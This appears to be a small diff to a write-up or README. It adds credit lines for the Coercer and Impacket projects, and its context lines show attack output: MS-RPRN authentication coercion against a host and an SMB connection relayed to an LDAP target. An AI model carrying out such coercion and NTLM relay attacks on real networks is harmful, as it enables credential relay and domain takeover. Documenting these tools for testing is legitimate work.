@@ -65,5 +65,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
       [!] (NO_AUTH_RECEIVED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotification(pszLocalMachine='\\192.168.1.10\x00') 
       [>] (-testing-) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotificationEx(pszLocalMachine='\\192.168.1.10\x00') 
 [*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.1.5, attacking target ldap://192.168.1.25
-
 ```
+
+Shoutout to p0dalirius for Coercer https://github.com/p0dalirius/Coercer
+Shoutout to fortra for Impacket https://github.com/fortra/impacket
